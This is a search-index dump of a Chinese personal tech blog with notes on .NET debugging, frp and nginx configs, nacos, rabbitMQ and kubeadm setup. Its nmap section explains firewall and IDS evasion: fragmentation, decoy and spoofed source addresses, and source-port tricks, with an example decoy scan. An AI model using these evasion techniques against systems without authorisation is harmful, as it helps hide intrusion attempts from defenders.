","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:2:2","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#查看-dotnet-应用"},{"categories":["blog"],"content":" 查看指定进程的状态 # 每秒刷新1次进程22884的情况 dotnet-counters monitor --refresh-interval 1 -p 22884 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:2:3","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#查看指定进程的状态"},{"categories":["blog"],"content":" 内存转储 dotnet-dump collect -p 4807 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:2:4","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#内存转储"},{"categories":["blog"],"content":" 分析转储文件 dotnet-dump analyze core_20190430_185145 # 输入 SOS 命令 # 分析对象大小与占用 dumpheap -stat # 查看指定对象的情况 方法表 (MT) dumpheap -mt 00007faddaa50f90 # 查看此资源大多被什么对象所持有，由此定位问题 gcroot -all 00007f6ad09421f8 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:2:5","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#分析转储文件"},{"categories":["blog"],"content":" 追踪 cpu 等资源变化 dotnet-trace collect -p pid # 等待一段时间后enter或ctrl+c关闭 # 抓到本地以后用perfview打开分析 https://github.com/microsoft/perfview ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/:2:6","series":null,"tags":["blog","csharp"],"title":"csharp性能调试","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E6%80%A7%E8%83%BD%E8%B0%83%E8%AF%95/#追踪-cpu-等资源变化"},{"categories":["blog"],"content":"`frp` 是一个内网穿透工具.这里记录一下之前用过的配置.","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","frp"],"title":"frp配置","uri":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介frp 是一个内网穿透工具. 这里记录一下之前用过的配置. ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","frp"],"title":"frp配置","uri":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 内容 服务端 frps [common] # 限制主机、监听端口 bind_addr = 0.0.0.0 bind_port = 7000 # http的web访问端口 # https用vhost_https_port vhost_http_port = 20000 # 验证 token = 验证密码 # web监控面板 dashboard_addr = 127.0.0.1 dashboard_port = 7001 dashboard_user = 用户名 dashboard_pwd = 验证密码 # 日志路径 log_file = console # 一级域名 subdomain_host = kentxxq.com [frp] type = http subdomain = frp-python5001 # 可以指定token token = frp-python5 客户端 frpc [common] server_addr = frp.kentxxq.com server_port = 7000 token = 验证密码,对应服务端 log_file = console [frp-python5000] # 访问地址frp-python5000.kentxxq.com type = http local_port = 5000 subdomain = frp-python5000 反向代理 nginx代理页面: server { listen 443 ssl; server_name ~frp-.*; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frp.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:20000; proxy_set_header Host $host; } } server { listen 80; server_name frp.kentxxq.com; return 301 https://$server_name$request_uri; } 监控页面: server { listen 443 ssl; server_name frps-static.kentxxq.com; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frps-static.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:7001; } } server { listen 80; server_name frps-static.kentxxq.com; return 301 https://$server_name$request_uri; } ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","frp"],"title":"frp配置","uri":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/#内容"},{"categories":["blog"],"content":" 内容 服务端 frps [common] # 限制主机、监听端口 bind_addr = 0.0.0.0 bind_port = 7000 # http的web访问端口 # https用vhost_https_port vhost_http_port = 20000 # 验证 token = 验证密码 # web监控面板 dashboard_addr = 127.0.0.1 dashboard_port = 7001 dashboard_user = 用户名 dashboard_pwd = 验证密码 # 日志路径 log_file = console # 一级域名 subdomain_host = kentxxq.com [frp] type = http subdomain = frp-python5001 # 可以指定token token = frp-python5 客户端 frpc [common] server_addr = frp.kentxxq.com server_port = 7000 token = 验证密码,对应服务端 log_file = console [frp-python5000] # 访问地址frp-python5000.kentxxq.com type = http local_port = 5000 subdomain = frp-python5000 反向代理 nginx代理页面: server { listen 443 ssl; server_name ~frp-.*; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frp.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:20000; proxy_set_header Host $host; } } server { listen 80; server_name frp.kentxxq.com; return 301 https://$server_name$request_uri; } 监控页面: server { listen 443 ssl; server_name frps-static.kentxxq.com; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frps-static.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:7001; } } server { listen 80; server_name frps-static.kentxxq.com; return 301 https://$server_name$request_uri; } ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","frp"],"title":"frp配置","uri":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/#服务端-frps"},{"categories":["blog"],"content":" 内容 服务端 frps [common] # 限制主机、监听端口 bind_addr = 0.0.0.0 bind_port = 7000 # http的web访问端口 # https用vhost_https_port vhost_http_port = 20000 # 验证 token = 验证密码 # web监控面板 dashboard_addr = 127.0.0.1 dashboard_port = 7001 dashboard_user = 用户名 dashboard_pwd = 验证密码 # 日志路径 log_file = console # 一级域名 subdomain_host = kentxxq.com [frp] type = http subdomain = frp-python5001 # 可以指定token token = frp-python5 客户端 frpc [common] server_addr = frp.kentxxq.com server_port = 7000 token = 验证密码,对应服务端 log_file = console [frp-python5000] # 访问地址frp-python5000.kentxxq.com type = http local_port = 5000 subdomain = frp-python5000 反向代理 nginx代理页面: server { listen 443 ssl; server_name ~frp-.*; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frp.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:20000; proxy_set_header Host $host; } } server { listen 80; server_name frp.kentxxq.com; return 301 https://$server_name$request_uri; } 监控页面: server { listen 443 ssl; server_name frps-static.kentxxq.com; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frps-static.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:7001; } } server { listen 80; server_name frps-static.kentxxq.com; return 301 https://$server_name$request_uri; } ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","frp"],"title":"frp配置","uri":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/#客户端-frpc"},{"categories":["blog"],"content":" 内容 服务端 frps [common] # 限制主机、监听端口 bind_addr = 0.0.0.0 bind_port = 7000 # http的web访问端口 # https用vhost_https_port vhost_http_port = 20000 # 验证 token = 验证密码 # web监控面板 dashboard_addr = 127.0.0.1 dashboard_port = 7001 dashboard_user = 用户名 dashboard_pwd = 验证密码 # 日志路径 log_file = console # 一级域名 subdomain_host = kentxxq.com [frp] type = http subdomain = frp-python5001 # 可以指定token token = frp-python5 客户端 frpc [common] server_addr = frp.kentxxq.com server_port = 7000 token = 验证密码,对应服务端 log_file = console [frp-python5000] # 访问地址frp-python5000.kentxxq.com type = http local_port = 5000 subdomain = frp-python5000 反向代理 nginx代理页面: server { listen 443 ssl; server_name ~frp-.*; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frp.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:20000; proxy_set_header Host $host; } } server { listen 80; server_name frp.kentxxq.com; return 301 https://$server_name$request_uri; } 监控页面: server { listen 443 ssl; server_name frps-static.kentxxq.com; ssl_certificate /etc/nginx/ssl/kentxxq.cer; ssl_certificate_key /etc/nginx/ssl/kentxxq.key; access_log /tmp/frps-static.kentxxq.com.log main; location / { proxy_pass http://127.0.0.1:7001; } } server { listen 80; server_name frps-static.kentxxq.com; return 301 https://$server_name$request_uri; } ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","frp"],"title":"frp配置","uri":"/posts/%E7%AC%94%E8%AE%B0/frp%E9%85%8D%E7%BD%AE/#反向代理-nginx"},{"categories":["blog"],"content":" 简介记录家里机器的应用部署. ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/home-server%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["blog","vps"],"title":"home-server部署记录","uri":"/posts/%E7%AC%94%E8%AE%B0/home-server%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/#简介"},{"categories":["blog"],"content":" 内容#todo/笔记 Nginx Rclone Filebrowser Ddns-go jellyfin ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/home-server%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["blog","vps"],"title":"home-server部署记录","uri":"/posts/%E7%AC%94%E8%AE%B0/home-server%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/#内容"},{"categories":["point"],"content":"nacos 是一个配置, 注册中间件. 要点: 免费, 开源 阿里巴巴支持, 且有商业版 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/:0:0","series":null,"tags":["point","nacos"],"title":"nacos","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/#"},{"categories":["point"],"content":" docker-compose 运行验证参考链接 Nacos Docker 快速开始 git clone https://github.com/nacos-group/nacos-docker.git cd nacos-docker docker compose -f example/standalone-derby.yaml up 上面的版本有 prometheus 和 grafana,去掉以后加鉴权. version: \"2\" services: nacos: image: nacos/nacos-server:latest container_name: nacos environment: - PREFER_HOST_MODE=hostname - MODE=standalone - NACOS_AUTH_ENABLE=true - NACOS_AUTH_IDENTITY_KEY=你的key - NACOS_AUTH_IDENTITY_VALUE=你的value - NACOS_AUTH_TOKEN=你的秘钥SecretKey012345678901234567890123456789012345678901234567890123456789 volumes: - ./data:/home/nacos/data - ./standalone-logs/:/home/nacos/logs ports: - \"8848:8848\" - \"9848:9848\" ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/:0:1","series":null,"tags":["point","nacos"],"title":"nacos","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/#笔记pointdocker-composedocker-compose-运行验证"},{"categories":["point"],"content":" 正常运行 到 Releases · alibaba/nacos (github.com) 下载最新版本, 解压 创建数据库 nacos_config, 执行 sql 文件 conf/mysql-schema.sql 编辑配置文件 conf/application.properties # 数据库连接 spring.sql.init.platform=mysql db.num=1 db.url.0=jdbc:mysql://127.0.0.1:3306/nacos_config?characterEncoding=utf8\u0026connectTimeout=1000\u0026socketTimeout=3000\u0026autoReconnect=true\u0026useUnicode=true\u0026useSSL=false\u0026serverTimezone=UTC db.user.0=root db.password.0=密码 # 开启授权 # 参考 https://nacos.io/zh-cn/docs/v2/guide/user/auth.html nacos.core.auth.server.identity.key=你的key nacos.core.auth.server.identity.value=你的value nacos.core.auth.plugin.nacos.token.secret.key=base64后的 启动 bin/startup.sh -m standalone ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/:0:2","series":null,"tags":["point","nacos"],"title":"nacos","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/#正常运行"},{"categories":["point"],"content":" 重要备注 登录 nacos/nacos, 记得要修改密码 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/:0:3","series":null,"tags":["point","nacos"],"title":"nacos","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/#重要备注"},{"categories":["point"],"content":" 转发配置nginx 转发 server { listen 443 ssl; server_name nacos.kentxxq.com; ssl_certificate /usr/local/nginx/conf/ssl/kentxxq.cer; ssl_certificate_key /usr/local/nginx/conf/ssl/kentxxq.key; location / { proxy_pass http://127.0.0.1:8848; } } server { listen 80; server_name nacos.kentxxq.com; return 301 https://$server_name$request_uri; } ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/:0:4","series":null,"tags":["point","nacos"],"title":"nacos","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nacos/#转发配置"},{"categories":["blog"],"content":" 简介nmap 是一个探测工具. ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:1:0","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#简介"},{"categories":["blog"],"content":" 常用命令 # 检测常用端口,快速返回 nmap -A test.kentxxq.com -T4 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:2:0","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#常用命令"},{"categories":["blog"],"content":" 解读","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:3:0","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#解读"},{"categories":["blog"],"content":" 目标地址参数 192.168.1.0/24 //扫描局域网内的256个ip 40/24效果也是一样的，关键在于/number 192.168.1.1-256 192.168.1.0/16 //扫描65536个ip 192.168.1-256.1-256 //更多用法 nmap target_ip 192.168.0,1,3-7,0-255 //排除这个ip地址 --exclude target_ip ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:3:1","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#目标地址参数"},{"categories":["blog"],"content":" 主机发现 -sL(列表扫描): 只是把对应所有的主机 ip 列出来,所以没有发送报文 -sP(PING扫描): ping 主机，然后返回存活的主机 -P0: 不进行 ping 操作，认为所有的主机都是存活的。对符合条件的 ip 进行扫描等 -PS21，23，1521(syn 半连接攻击): SYN 标志位告诉对方您正试图建立一个连接。如果端口关闭, 恢复 RST(复位). 开放则回复 SYN/ACK (确认). -PA21,23,1521(ack报文，用于确定链接): ACK 报文表示确认一个建立连接的尝试，但该连接尚未完全建立。所以远程主机应该总是回应一个 RST 报文，因为它们并没有发出过连接请求到运行 Nmap 的机器. -PU21,23.1521(UDP Ping 默认31338): 1.一般不会有响应。如果提示无法到达，有可能会返回 RST，则目标主机存活。 2.用于有可能仅 tcp 被过滤。提示无法到达，则会暴露目标存在 -PE; -PP; -PM (ICMP Ping Types): 有可能屏蔽了一些 icmp 协议的类型。进行多个类型的尝试 -PR (ARP Ping): 更快更准确，默认就会使用。 提供 -PS 和 -PA 两种 ping 探测的原因是使通过防火墙的机会尽可能大。许多管理员会配置他们的路由器或者其它简单的防火墙来封锁 SYN 报文，除非连接目标是那些公开的服务器像公司网站或者邮件服务器。这可以阻止其它进入组织的连接，同时也允许用户访问互联网。这种无状态的方法几乎不占用防火墙/路由器的资源，因而被硬件和软件过滤器广泛支持。Linux Netfilter/iptables 防火墙软件提供方便的 –syn 选项来实现这种无状态的方法。当这样的无状态防火墙规则存在时，发送到关闭目标端口的 SYN ping 探测 (-PS) 很可能被封锁。这种情况下，ACK 探测格外有闪光点，因为它正好利用了这样的规则。另外一种常用的防火墙用有状态的规则来封锁非预期的报文。这一特性已开始只存在于高端防火墙，但是这些年类它越来越普遍了。 Linux Netfilter/iptables 通过 –state 选项支持这一特性，它根据连接状态把报文进行分类。SYN 探测更有可能用于这样的系统，由于没头没脑的 ACK 报文通常会被识别成伪造的而丢弃。解决这个两难的方法是通过即指定 -PS 又指定 -PA 来即发送 SYN 又发送 ACK。 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:3:2","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#主机发现"},{"categories":["blog"],"content":" 端口扫描 -sS (TCP SYN扫描): 默认的，速度超快的端口扫描, 明确区分端口状态 -sT (TCP connect()扫描): 速度慢一些, 适用于 syn 被屏蔽无法使用. 但是极有可能记录到 syslog 日志 -sU (UDP扫描): 可以和 sS 一起使用, 速度慢. --host-timeout 跳过慢速的主机用于加速 udp 扫描 -sA (TCP ACK扫描): 无法确定端口状态 -sW (TCP窗口扫描): 开放端口为正数, 关闭端口大小的 0. 可以用于分析 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:3:3","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#端口扫描"},{"categories":["blog"],"content":" 综合扫描/系统扫描-A: 系统版本, 端口, ssl 等信息 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:3:4","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#综合扫描系统扫描"},{"categories":["blog"],"content":" 隐蔽扫描 分片Fragmentation: 将可疑的探测包进行分片处理（例如将 TCP 包拆分成多个 IP 包发送过去），某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查。 IP诱骗IP decoys: 在进行扫描时，将真实 IP 地址和其他主机的 IP 地址（其他主机需要在线，否则目标主机将回复大量数据包到不存在的主机，从而实质构成了拒绝服务攻击）混合使用，以此让目标主机的防火墙或 IDS 追踪检查大量的不同 IP 地址的数据包，降低其追查到自身的概率。注意，某些高级的 IDS 系统通过统计分析仍然可以追踪出扫描者真实 IP 地址。 IP伪装IP Spoofing: 顾名思义，IP 伪装即将自己发送的数据包中的 IP 地址伪装成其他主机的地址，从而目标机认为是其他主机在与之通信。需要注意，如果希望接收到目标主机的回复包，那么伪装的 IP 需要位于统一局域网内。另外，如果既希望隐蔽自己的 IP 地址，又希望收到目标主机的回复包，那么可以尝试使用 idle scan 或匿名代理（如 TOR）等网络技术。 指定源端口: 某些目标主机只允许来自特定端口的数据包通过防火墙。例如 FTP 服务器配置为：允许源端口为 21 号的 TCP 包通过防火墙与 FTP 服务端通信，但是源端口为其他端口的数据包被屏蔽。所以，在此类情况下，可以指定 Nmap 将发送的数据包的源端口都设置特定的端口。 扫描延时: 某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率（例如，Solaris 系统通常会限制每秒钟只能产生一个 ICMP 消息回复给 UDP 扫描），所以，定制该情况下发包的频率和发包延时可以降低目标主机的审查强度、节省网络带宽。 其他技术: Nmap 还提供多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的 MTU、指定 TTL、指定伪装的 MAC 地址、使用错误检查和（badchecksum）. 更多信息 http://nmap.org/book/man-bypass-firewalls-ids.html 使用方法 -f; --mtu : 指定使用分片、指定数据包的MTU -D : 用一组IP地址掩盖真实地址，其中ME填入自己的IP地址 -S : 伪装成其他IP地址 -e : 使用特定的网络接口 -g/--source-port : 使用指定源端口 --data-length : 填充随机数据让数据包长度达到Num --ip-options : 使用指定的IP选项来发送数据包 --ttl : 设置time-to-live时间 --spoof-mac : 伪装MAC地址 --badsum: 使用错误的checksum来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或IDS/IPS）。 示例: nmap -v -F -Pn -D192.168.1.100,192.168.1.102,ME -e eth0 -g 3355 192.168.1.1 其中，-F表示快速扫描100个端口；-Pn表示不进行Ping扫描；-D表示使用IP诱骗方式掩盖自己真实IP（其中ME表示自己IP）；-e eth0表示使用eth0网卡发送该数据包；-g 3355表示自己的源端口使用3355；192.168.1.1是被扫描的目标IP地址。 我们可以从Wireshark中看到数据包的流动情况：对于每个探测包，Nmap都使用-D选项指定的IP地址发送不同的数据包，从而达到扰乱对方 防火墙/IDS检查的目的（更好的方式-D选项中嵌入RND随机数，这样更具有迷惑性）。当探测到80端口时候，目标主机向我们回复了SYN/ACK包回 来（当然也向其他诱骗的IP回复SYN/ACK包，我们无法接收到），证明80端口是开放的。 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/:3:5","series":null,"tags":["blog"],"title":"nmap使用","uri":"/posts/%E7%AC%94%E8%AE%B0/nmap%E4%BD%BF%E7%94%A8/#隐蔽扫描"},{"categories":["point"],"content":"rabbitMQ 是一个消息中间件. 要点: 开源免费 用户量较大 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/rabbitmq/:0:0","series":null,"tags":["point","rabbitMQ"],"title":"rabbitMQ","uri":"/posts/%E7%AC%94%E8%AE%B0/point/rabbitmq/#"},{"categories":["point"],"content":" 运行 docker run -d --rm -p 5672:5672 --hostname my-rabbit --name some-rabbit -e RABBITMQ_DEFAULT_USER=user -e RABBITMQ_DEFAULT_PASS=password rabbitmq:latest ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/rabbitmq/:0:1","series":null,"tags":["point","rabbitMQ"],"title":"rabbitMQ","uri":"/posts/%E7%AC%94%E8%AE%B0/point/rabbitmq/#运行"},{"categories":["blog"],"content":" 简介记录一下 Rider 的配置 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/rider%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog"],"title":"Rider配置","uri":"/posts/%E7%AC%94%E8%AE%B0/rider%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/rider%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog"],"title":"Rider配置","uri":"/posts/%E7%AC%94%E8%AE%B0/rider%E9%85%8D%E7%BD%AE/#内容"},{"categories":["blog"],"content":" 保存后格式化 # tool=\u003eaction on save=\u003e reformat and cleanup code ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/rider%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog"],"title":"Rider配置","uri":"/posts/%E7%AC%94%E8%AE%B0/rider%E9%85%8D%E7%BD%AE/#保存后格式化"},{"categories":["blog"],"content":" 简介这里记录 vps 的部署 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["blog"],"title":"vps部署记录","uri":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/#简介"},{"categories":["blog"],"content":" 部署内容","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["blog"],"title":"vps部署记录","uri":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/#部署内容"},{"categories":["blog"],"content":" 快速链接 nginx编译和升级 和 nginx配置 docker启动 nacos redis ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/:2:1","series":null,"tags":["blog"],"title":"vps部署记录","uri":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/#快速链接"},{"categories":["blog"],"content":" TestServer完善 cicd 的流程, 加入初始化的流程. #todo/笔记 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/:2:2","series":null,"tags":["blog"],"title":"vps部署记录","uri":"/posts/%E7%AC%94%E8%AE%B0/vps%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/#testserver"},{"categories":["blog"],"content":"安装 [[笔记/point/k8s|k8s]] 的记录.","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/"},{"categories":["blog"],"content":" 简介安装 k8s 的记录 -20230606. ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:1:0","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#简介"},{"categories":["blog"],"content":" 安装方式对比 安装方式 主要区别 传统方式 支撑性软件都是以服务的样式来进行运行，其他的组件以 pod 的方式来运行 Pod 方式 除了 kubelet 和容器环境基于服务的方式运行，其他的都以 pod 的方式来运行。 所有的 pod 都被 kubelet 以 manifest(配置清单) 的方式进行统一管理。 由于这种 pod 是基于节点指定目录下的配置文件统一管理的，所有我们将这些 pod 称为静态 pod 传统方式 软件源 二进制 ansible 自动化 pod 方式 kubeadm minikube ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:2:0","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#安装方式对比"},{"categories":["blog"],"content":" kubeadm 安装","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:3:0","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#kubeadm-安装"},{"categories":["blog"],"content":" 基础环境 # 主机名和固定ip hostnamectl set-hostname master1 reboot # 防火墙 ufw disable # 更新一下 apt update -y apt upgrade -y # 相关组件 apt install selinux-utils policycoreutils ntp ntpdate htop nethogs nload tree lrzsz iotop iptraf-ng zip unzip ca-certificates curl gnupg build-essential gperf ipset ipvsadm -y # selinux vim /etc/selinux/config SELINUX=disabled # 时间同步 crontab -e 0 */1 * * * /usr/sbin/ntpdate time1.aliyun.com # swap vim /etc/fstab # 注释掉swap # 内核 vim /etc/sysctl.d/k8s.conf net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward = 1 vm.swappiness = 0 # 模块加载 cat \u003c\u003cEOF | sudo tee /etc/modules-load.d/k8s.conf overlay br_netfilter EOF # 查看是否加载。出现了就是加载了 lsmod | grep br_netfilter br_netfilter 22256 0 bridge 151336 1 br_netfilter lsmod | grep overlay overlay 151552 0 # 确认为1 sysctl net.bridge.bridge-nf-call-iptables net.bridge.bridge-nf-call-ip6tables net.ipv4.ip_forward # ipvs相关 # apt install ipset ipvsadm -y # 加入 vim /etc/modules-load.d/k8s.conf overlay br_netfilter ip_vs ip_vs_rr ip_vs_wrr ip_vs_sh nf_conntrack ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:3:1","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#基础环境"},{"categories":["blog"],"content":" 容器相关 # 共享盘，可以忽略 mkdir /mnt/win mount -t cifs -o username=\"Everyone\" //192.168.2.100/vm_share /mnt/win cp /mnt/win/* . # cri-containerd-cni版本会有问题 https://github.com/containerd/containerd/releases tar Cxzvf /usr/local containerd-1.6.26-linux-amd64.tar.gz # 试试systemctl daemon-reload # 如果不行就找到它。放到/etc/systemd/system/下面重新daemon-reload find / -name containerd.service vim /etc/systemd/system/containerd.service [Unit] Description=containerd container runtime Documentation=https://containerd.io After=network.target local-fs.target [Service] 